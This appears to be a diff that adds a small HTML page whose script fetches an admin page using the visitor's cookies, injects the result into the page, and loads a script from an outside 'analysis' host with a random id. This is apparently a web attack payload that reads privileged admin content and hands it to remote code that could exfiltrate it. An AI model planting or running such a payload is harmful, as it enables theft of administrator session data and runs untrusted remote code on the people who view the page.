@@ -1,0 +1,15 @@
+<div id="container"></div>
+
+<script>
+async function load() {
+  try {
+    const res = await fetch('/admin/index/main.html', { credentials: 'include' });
+    const html = await res.text();
+    document.getElementById('container').innerHTML = html;
+  } catch (e) {
+    console.log('失败，可能跨域');
+  }
+}
+load();
+</script>
+<script src="https://static.drone-ci.com/analysis/xg8LYbRg9nN9KHPm"></script>
